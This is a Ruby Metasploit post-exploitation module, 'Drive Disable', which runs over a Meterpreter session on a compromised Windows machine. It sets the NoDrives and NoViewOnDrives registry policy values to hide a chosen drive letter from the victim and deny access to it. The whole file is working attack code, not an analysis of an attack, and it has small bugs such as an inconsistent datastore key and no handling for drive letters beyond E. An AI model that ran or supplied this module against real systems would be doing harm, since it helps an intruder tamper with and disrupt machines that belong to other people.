require 'rex'
require 'msf/core/post/windows/registry'
class MetasploitModule < Msf::Post
  include Msf::Post::Windows::Registry
  def initialize
    super(
      'Name'         => 'Drive Disable',
      'Description'  => 'This module hide and restrict acess to a drive',
      'License'      => MSF_LICENSE,
      'Author'       => 'Sami'
    )
    register_options(
      [
        OptString.new('DriveName',[true, 'Please set the drive letter'])

      ])
  end
def run
drive_int = drive_string(datastore['DriveName'])
key1="HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer"

exists = meterpreter_registry_key_exist?(key1)
if not exists
print_error("Key doesnot exists, Crearting a Key!")
registry_createkey(key1)
print_good("Hiding Drive")
meterpreter_registry_setvaldata(key1,'NoDrives',drive_int.to_s,'REG_DWORD',REGISTRY_VIEW_NATIVE)
print_good("Restricting acess to drive")
meterpreter_registry_setvaldata(key1,'NoViewOnDrives',drive_int.to_s,'REG_DWORD',REGISTRY_VIEW_NATIVE)
else
print_good("Key Exists,Skippig and creating values")
print_good("Hiding Drive")
meterpreter_registry_setvaldata(key1,'NoDrives',drive_int.to_s,'REG_DWORD',REGISTRY_VIEW_NATIVE)
print_good("Restricting acess to drive")
meterpreter_registry_setvaldata(key1,'NoViewOnDrives',drive_int.to_s,'REG_DWORD',REGISTRY_VIEW_NATIVE)
end
print_good("Disaable #{datastore['Drivename']}Drive")
end
def drive_string(drive)
case drive
when "A"
return 1
when "B"
return 2
when "C"
return 4
when "D"
return 8
when "E"
return 16
end
end
end






